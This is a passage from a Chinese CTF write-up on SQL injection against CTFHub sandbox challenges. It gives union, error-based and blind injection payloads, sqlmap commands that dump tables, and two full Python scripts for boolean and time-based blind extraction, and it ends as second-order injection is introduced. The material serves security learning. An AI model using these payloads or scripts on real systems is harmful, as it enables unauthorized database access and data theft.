E%BB%E9%87%8D%EF%BC%8C%E4%BD%BF%E7%94%A8UNION%20ALL%E3%80%82" >union 联合查询 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>语句内部每个 select 语句必须拥有相同的列。<code>union</code>也可用于查询列数。</li>
</ol>
<ul>
<li>输入<code>union select 1</code>无回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916765_6506609dab540b6023728.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>union select 1,2</code>有回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916821_650660d546a90eeed092e.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="4">
<li>利用<code>union</code>查询数据库名。</li>
</ol>
<ul>
<li>输入<code>-1 union select 1,database()</code>。让<code>id=-1</code>因为回显只有一行数据，需要让第一个 select 语句返回空。这里查询到一个<code>sqli</code>数据库。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694917239_650662772b8e7111dc06f.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,table_name from information_schema.tables where table_schema=&#39;sqli&#39;</code>。Mysql5.0以上版本中<code>information_schema</code>默认库保存了所有数据库信息。这里我们查询到了一个<code>flag</code>表。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694917671_650664275ef10bfc36caa.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;sqli&#39;</code>。通过<code>group_concat()</code>函数将多条数据组合成字符串输出，或者通过<code>limit</code>函数选择输出第几条数据。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918028_6506658c3aaaad01f227a.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918269_6506667d5ea3ec2a0c007.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;sqli&#39; and table_name=&#39;flag&#39;</code>，同样通过<code>information_schema</code>查询列名。flag 表中 只有一个 flag 列。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918728_65066848ed5194e1132da.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,group_concat(flag) from sqli.flag</code>。直接查询 flag 列中数据即可。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918968_650669383b276fdeff2c2.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<h3 id="sqlmap解法"><a href="#sqlmap解法" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><ul>
<li>输入<code>sqlmap --purge</code>清除原有数据。</li>
<li>输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 --tables</code>。<code>-u</code>指定<code>url</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925726_6506839ed41f7be2b056e.jpeg"
                      alt="图片.png"
                ><br>反馈<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925791_650683dfc0312ff3118a9.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</code>。<code>-D</code>指定数据库。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925898_6506844a0ba4ae76ab779.jpeg"
                      alt="图片.png"
                ><br>反馈<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925919_6506845fcf0c913dbdef5.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables --dump</code>, –dump 获取字段数据，或者输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --tables --dump</code>，-T 指定表名。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694926146_65068542367ee69412f81.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><h3 id="手动解法-1"><a href="#手动解法-1" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>判断列数。原理一样，记得输入<code>&#39;</code>闭合操作，然后注释掉后面自带的<code>&#39;</code>，<code>-- </code> 注释记得加一个空格，<code>#</code>则不用加空格。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694920851_650670932e7b75ae5560e.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694920866_650670a27aff291856c84.jpeg"
                      alt="图片.png"
                ></li>
<li>查询 flag。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694920986_6506711accedcd1cc6251.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694921008_6506713068062018bc4ff.jpeg"
                      alt="图片.png"
                ></li>
</ol>
<h3 id="sqlmap解法-1"><a href="#sqlmap解法-1" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><ul>
<li>输入<code>sqlmap --purge</code>清除原有数据。</li>
<li>解法和<code>整数型注入</code>相同。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1</span><br><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在无法利用<code>union</code>注入并回显报错信息时，可采用报错注入。人为制造错误条件，在报错信息中返回完整查询结果。</p>
<h3 id="手动解法-2"><a href="#手动解法-2" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>利用<code>extractvalue(XML_document, XPath_string)</code>和<code>updatexml(XML_document, XPath_string, new_value)</code>函数进行报错注入。<a class="link"   href="https://cloud.tencent.com/developer/article/1740429" >extractvalue()和updatexml() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>函数第二个参数不合法时，会将查询结果放在报错信息中。但 extractvalue() 函数最长报错32位。</li>
</ol>
<ul>
<li>输入 <code>1 and (extractvalue(1,concat(0x7e,(select database()),0x7e)))</code>。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694939858_6506bad23ae2111ed3a0c.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 and (extractvalue(1,concat(0x7e,(select flag from flag),0x7e)))</code>。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694939924_6506bb1469825c430249c.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<h3 id="sqlmap解法-2"><a href="#sqlmap解法-2" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><ul>
<li>解法和<code>整数型注入</code>相同。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1</span><br><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694940318_6506bc9ec18a01fe8bd3e.jpeg"
                      alt="图片.png"
                ></p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>回显只有<code>True</code>和<code>False</code>的情况。<a class="link"   href="https://blog.csdn.net/Xxy605/article/details/109750292" >思路解法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="手动解法-3"><a href="#手动解法-3" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>可以编写脚本，逐字节爆破。</li>
</ol>
<ul>
<li>输入<code>1 and 1=1</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941068_6506bf8ce8344cd7b2a76.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 and1=2</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941405_6506c0dd359632ea635fa.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 and (substr((select flag from flag),1,1)=&#39;c&#39;)</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941363_6506c0b35f287f501d352.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="2">
<li>脚本</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入库</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#设定环境URL，由于每次开启环境得到的URL都不同，需要修改！</span><br><span class="line">url = &#x27;http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/&#x27;</span><br><span class="line">#作为盲注成功的标记，成功页面会显示query_success</span><br><span class="line">success_mark = &quot;query_success&quot;</span><br><span class="line">#把字母表转化成ascii码的列表，方便便利，需要时再把ascii码通过chr(int)转化成字母</span><br><span class="line">ascii_range = range(ord(&#x27;a&#x27;),1+ord(&#x27;z&#x27;))</span><br><span class="line">#flag的字符范围列表，包括花括号、a-z，数字0-9</span><br><span class="line">str_range = [123,125] + list(ascii_range) + list(range(48,58))</span><br><span class="line"></span><br><span class="line">#自定义函数获取数据库名长度</span><br><span class="line">def getLengthofDatabase():</span><br><span class="line">	#初始化库名长度为1</span><br><span class="line">    i = 1</span><br><span class="line">    #i从1开始，无限循环库名长度</span><br><span class="line">    while True:</span><br><span class="line">        new_url = url + &quot;?id=1 and length(database())=&#123;&#125;&quot;.format(i)</span><br><span class="line">        #GET请求</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        #如果返回的页面有query_success，即盲猜成功即跳出无限循环</span><br><span class="line">        if success_mark in r.text:</span><br><span class="line">        	#返回最终库名长度</span><br><span class="line">            return i</span><br><span class="line">        #如果没有匹配成功，库名长度+1接着循环</span><br><span class="line">        i = i + 1</span><br><span class="line"></span><br><span class="line">#自定义函数获取数据库名</span><br><span class="line">def getDatabase(length_of_database):</span><br><span class="line">	#定义存储库名的变量</span><br><span class="line">    name = &quot;&quot;</span><br><span class="line">    #库名有多长就循环多少次</span><br><span class="line">    for i in range(length_of_database):</span><br><span class="line">    	#切片，对每一个字符位遍历字母表</span><br><span class="line">    	#i+1是库名的第i+1个字符下标，j是字符取值a-z</span><br><span class="line">        for j in ascii_range:</span><br><span class="line">            new_url = url + &quot;?id=1 and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i+1,chr(j))</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#匹配到就加到库名变量里</span><br><span class="line">                name += chr(j)</span><br><span class="line">                #当前下标字符匹配成功，退出遍历，对下一个下标进行遍历字母表</span><br><span class="line">                break</span><br><span class="line">    #返回最终的库名</span><br><span class="line">    return name</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库的表数量</span><br><span class="line">def getCountofTables(database):</span><br><span class="line">	#初始化表数量为1</span><br><span class="line">    i = 1</span><br><span class="line">    #i从1开始，无限循环</span><br><span class="line">    while True:</span><br><span class="line">        new_url = url + &quot;?id=1 and (select count(*) from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27;)=&#123;&#125;&quot;.format(database,i)</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        if success_mark in r.text:</span><br><span class="line">        	#返回最终表数量</span><br><span class="line">            return i</span><br><span class="line">        #如果没有匹配成功，表数量+1接着循环</span><br><span class="line">        i = i + 1</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库所有表的表名长度</span><br><span class="line">def getLengthListofTables(database,count_of_tables):</span><br><span class="line">	#定义存储表名长度的列表</span><br><span class="line">	#使用列表是考虑表数量不为1，多张表的情况</span><br><span class="line">    length_list=[]</span><br><span class="line">    #有多少张表就循环多少次</span><br><span class="line">    for i in range(count_of_tables):</span><br><span class="line">    	#j从1开始，无限循环表名长度</span><br><span class="line">        j = 1</span><br><span class="line">        while True:</span><br><span class="line">        	#i+1是第i+1张表</span><br><span class="line">            new_url = url + &quot;?id=1 and length((select table_name from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1))=&#123;&#125;&quot;.format(database,i,j)</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#匹配到就加到表名长度的列表</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                break</span><br><span class="line">            #如果没有匹配成功，表名长度+1接着循环</span><br><span class="line">            j = j + 1</span><br><span class="line">    #返回最终的表名长度的列表</span><br><span class="line">    return length_list</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库所有表的表名</span><br><span class="line">def getTables(database,count_of_tables,length_list):</span><br><span class="line">    #定义存储表名的列表</span><br><span class="line">    tables=[]</span><br><span class="line">    #表数量有多少就循环多少次</span><br><span class="line">    for i in range(count_of_tables):</span><br><span class="line">    	#定义存储表名的变量</span><br><span class="line">        name = &quot;&quot;</span><br><span class="line">        #表名有多长就循环多少次</span><br><span class="line">        #表长度和表序号（i）一一对应</span><br><span class="line">        for j in range(length_list[i]):</span><br><span class="line">        	#k是字符取值a-z</span><br><span class="line">            for k in ascii_range:</span><br><span class="line">                new_url = url + &quot;?id=1 and substr((select table_name from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(database,i,j+1,chr(k))</span><br><span class="line">                r = requests.get(new_url)</span><br><span class="line">                if success_mark in r.text:</span><br><span class="line">                	#匹配到就加到表名变量里</span><br><span class="line">                    name = name + chr(k)</span><br><span class="line">                    break</span><br><span class="line">        #添加表名到表名列表里</span><br><span class="line">        tables.append(name)</span><br><span class="line">    #返回最终的表名列表</span><br><span class="line">    return tables</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定表的列数量</span><br><span class="line">def getCountofColumns(table):</span><br><span class="line">	#初始化列数量为1</span><br><span class="line">    i = 1</span><br><span class="line">    #i从1开始，无限循环</span><br><span class="line">    while True:</span><br><span class="line">        new_url = url + &quot;?id=1 and (select count(*) from information_schema.columns where table_name=&#x27;&#123;&#125;&#x27;)=&#123;&#125;&quot;.format(table,i)</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        if success_mark in r.text:</span><br><span class="line">        	#返回最终列数量</span><br><span class="line">            return i</span><br><span class="line">        #如果没有匹配成功，列数量+1接着循环</span><br><span class="line">        i = i + 1</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库指定表的所有列的列名长度</span><br><span class="line">def getLengthListofColumns(database,table,count_of_column):</span><br><span class="line">	#定义存储列名长度的变量</span><br><span class="line">	#使用列表是考虑列数量不为1，多个列的情况</span><br><span class="line">    length_list=[]</span><br><span class="line">    #有多少列就循环多少次</span><br><span class="line">    for i in range(count_of_column):</span><br><span class="line">        #j从1开始，无限循环列名长度</span><br><span class="line">        j = 1</span><br><span class="line">        while True:</span><br><span class="line">            new_url = url + &quot;?id=1 and length((select column_name from information_schema.columns where table_schema=&#x27;&#123;&#125;&#x27; and table_name=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1))=&#123;&#125;&quot;.format(database,table,i,j)</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#匹配到就加到列名长度的列表</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                break</span><br><span class="line">            #如果没有匹配成功，列名长度+1接着循环</span><br><span class="line">            j = j + 1</span><br><span class="line">    #返回最终的列名长度的列表</span><br><span class="line">    return length_list</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库指定表的所有列名</span><br><span class="line">def getColumns(database,table,count_of_columns,length_list):</span><br><span class="line">	#定义存储列名的列表</span><br><span class="line">    columns = []</span><br><span class="line">    #列数量有多少就循环多少次</span><br><span class="line">    for i in range(count_of_columns):</span><br><span class="line">        #定义存储列名的变量</span><br><span class="line">        name = &quot;&quot;</span><br><span class="line">        #列名有多长就循环多少次</span><br><span class="line">        #列长度和列序号（i）一一对应</span><br><span class="line">        for j in range(length_list[i]):</span><br><span class="line">            for k in ascii_range:</span><br><span class="line">                new_url = url + &quot;?id=1 and substr((select column_name from information_schema.columns where table_schema=&#x27;&#123;&#125;&#x27; and table_name=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(database,table,i,j+1,chr(k))</span><br><span class="line">                r = requests.get(new_url)</span><br><span class="line">                if success_mark in r.text:</span><br><span class="line">                	#匹配到就加到列名变量里</span><br><span class="line">                    name = name + chr(k)</span><br><span class="line">                    break</span><br><span class="line">        #添加列名到列名列表里</span><br><span class="line">        columns.append(name)</span><br><span class="line">    #返回最终的列名列表</span><br><span class="line">    return columns</span><br><span class="line"></span><br><span class="line">#对指定库指定表指定列爆数据（flag）</span><br><span class="line">def getData(database,table,column,str_list):</span><br><span class="line">	#初始化flag长度为1</span><br><span class="line">    j = 1</span><br><span class="line">    #j从1开始，无限循环flag长度</span><br><span class="line">    while True:</span><br><span class="line">    	#flag中每一个字符的所有可能取值</span><br><span class="line">        for i in str_list:</span><br><span class="line">            new_url = url + &quot;?id=1 and substr((select &#123;&#125; from &#123;&#125;.&#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(column,database,table,j,chr(i))</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            #如果返回的页面有query_success，即盲猜成功，跳过余下的for循环</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#显示flag</span><br><span class="line">                print(chr(i),end=&quot;&quot;)</span><br><span class="line">                #flag的终止条件，即flag的尾端右花括号</span><br><span class="line">                if chr(i) == &quot;&#125;&quot;:</span><br><span class="line">                    print()</span><br><span class="line">                    return 1</span><br><span class="line">                break</span><br><span class="line">        #如果没有匹配成功，flag长度+1接着循环</span><br><span class="line">        j = j + 1</span><br><span class="line"></span><br><span class="line">#--主函数--</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	#爆flag的操作</span><br><span class="line">	#还有仿sqlmap的UI美化</span><br><span class="line">    print(&quot;Judging the number of tables in the database...&quot;)</span><br><span class="line">    database = getDatabase(getLengthofDatabase())</span><br><span class="line">    count_of_tables = getCountofTables(database)</span><br><span class="line">    print(&quot;[+]There are &#123;&#125; tables in this database&quot;.format(count_of_tables))</span><br><span class="line">    print()</span><br><span class="line">    print(&quot;Getting the table name...&quot;)</span><br><span class="line">    length_list_of_tables = getLengthListofTables(database,count_of_tables)</span><br><span class="line">    tables = getTables(database,count_of_tables,length_list_of_tables)</span><br><span class="line">    for i in tables:</span><br><span class="line">        print(&quot;[+]&#123;&#125;&quot;.format(i))</span><br><span class="line">    print(&quot;The table names in this database are : &#123;&#125;&quot;.format(tables))</span><br><span class="line"></span><br><span class="line">	#选择所要查询的表</span><br><span class="line">    i = input(&quot;Select the table name:&quot;)</span><br><span class="line"></span><br><span class="line">    if i not in tables:</span><br><span class="line">        print(&quot;Error!&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    print()</span><br><span class="line">    print(&quot;Getting the column names in the &#123;&#125; table......&quot;.format(i))</span><br><span class="line">    count_of_columns = getCountofColumns(i)</span><br><span class="line">    print(&quot;[+]There are &#123;&#125; tables in the &#123;&#125; table&quot;.format(count_of_columns,i))</span><br><span class="line">    length_list_of_columns = getLengthListofColumns(database,i,count_of_columns)</span><br><span class="line">    columns = getColumns(database,i,count_of_columns,length_list_of_columns)</span><br><span class="line">    print(&quot;[+]The column(s) name in &#123;&#125; table is:&#123;&#125;&quot;.format(i,columns))</span><br><span class="line"></span><br><span class="line">	#选择所要查询的列</span><br><span class="line">    j = input(&quot;Select the column name:&quot;)</span><br><span class="line"></span><br><span class="line">    if j not in columns:</span><br><span class="line">        print(&quot;Error!&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    print()</span><br><span class="line">    print(&quot;Getting the flag......&quot;)</span><br><span class="line">    print(&quot;[+]The flag is &quot;,end=&quot;&quot;)</span><br><span class="line">    getData(database,i,j,str_range)</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941947_6506c2fb60cad0ca1b84a.jpeg"
                      alt="图片.png"
                ></p>
<h3 id="sqlmap解法-3"><a href="#sqlmap解法-3" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1</span><br><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>没有回显结果，无法通过回显判断 SQL 语句是否执行成功。通常采用<code>if((bool),sleep(3),0)</code>语句，通过页面响应时间判断是否存在时间盲注。<a class="link"   href="https://blog.csdn.net/weixin_45254208/article/details/107578439" >思路解法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<h3 id="手动解法-4"><a href="#手动解法-4" class="headerlink" title="手动解法"></a>手动解法</h3><ul>
<li>输入<code>1 and if(length(database())=4,sleep(3),0)</code>。页面 sleep(3) 秒左右，然后响应。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694943271_6506c827937d659d67625.jpeg"
                      alt="图片.png"
                ></li>
<li>脚本</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># _*_  coding:utf-8 _*_</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">session=requests.session()</span><br><span class="line">url = &quot;http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=&quot;</span><br><span class="line">name = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for k in range(1,10):</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">		print(i)</span><br><span class="line">		for j in range(31,128):</span><br><span class="line">			j = (128+31) -j</span><br><span class="line">			str_ascii=chr(j)</span><br><span class="line">			#数据库名</span><br><span class="line">			payolad = &quot;if(substr(database(),%s,1) = &#x27;%s&#x27;,sleep(1),1)&quot;%(str(i),str(str_ascii))</span><br><span class="line">			#表名</span><br><span class="line">			#payolad = &quot;if(substr((select table_name from information_schema.tables where table_schema=&#x27;sqli&#x27; limit %d,1),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot; %(k,i,str(str_ascii))</span><br><span class="line">			#字段名</span><br><span class="line">			#payolad = &quot;if(substr((select column_name from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=&#x27;sqli&#x27;),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot; %(i,str(str_ascii))</span><br><span class="line">			start_time=time.time()</span><br><span class="line">			str_get = session.get(url=url + payolad)</span><br><span class="line">			end_time = time.time()</span><br><span class="line">			t = end_time - start_time</span><br><span class="line">			if t &gt; 1:</span><br><span class="line">				if str_ascii == &quot;+&quot;:</span><br><span class="line">					sys.exit()</span><br><span class="line">				else:</span><br><span class="line">					name+=str_ascii</span><br><span class="line">					break</span><br><span class="line">		print(name)</span><br><span class="line"></span><br><span class="line">#查询字段内容</span><br><span class="line">for i in range(1,50):</span><br><span class="line">	print(i)</span><br><span class="line">	for j in range(31,128):</span><br><span class="line">		j = (128+31) -j</span><br><span class="line">		str_ascii=chr(j)</span><br><span class="line">		payolad = &quot;if(substr((select flag from sqli.flag),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot; %(i,str_ascii)</span><br><span class="line">		start_time = time.time()</span><br><span class="line">		str_get = session.get(url=url + payolad)</span><br><span class="line">		end_time = time.time()</span><br><span class="line">		t = end_time - start_time</span><br><span class="line">		if t &gt; 1:</span><br><span class="line">			if str_ascii == &quot;+&quot;:</span><br><span class="line">				sys.exit()</span><br><span class="line">			else:</span><br><span class="line">				name += str_ascii</span><br><span class="line">				break</span><br><span class="line">	print(name)</span><br></pre></td></tr></table></figure></div>

<h3 id="sqlmap解法-4"><a href="#sqlmap解法-4" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 -level=5 risk=3</span><br><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694944289_6506cc2183450b2d166e8.jpeg"
                      alt="图片.png"
                ></p>
<h1 id="sql注入进阶"><a href="#sql注入进阶" class="headerlink" title="sql注入进阶"></a>sql注入进阶</h1><ul>
<li><strong>参考书籍《CTF实战：技术、解题与进阶》</strong></li>
</ul>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><ul>
<li>原理：二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入，二次注入是输入数据经处理后存储，取出后，再次进入到 SQL 查询，以绕过开发人员设置的一些检查。</li>
</ul>
<ol>
<li>第一步，插入恶意数据。Web程序对插入的数据进行转义和过滤，写入数据库时又将其还原。</li>
<li>第二步，引用恶意数据。Web程序将数据从数据库中取出并调用时，恶意 SQL 语句被带入原始语句中，造成 SQL 二次注入。</li>
</ol>
<ul>
<li>例题：sqli-labs-24。<br>登陆界面：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694949921_6506e2212317dbf6d9192.jpeg"
                      alt="图片.png"
                ><br>登陆代码：</li>
</ul>
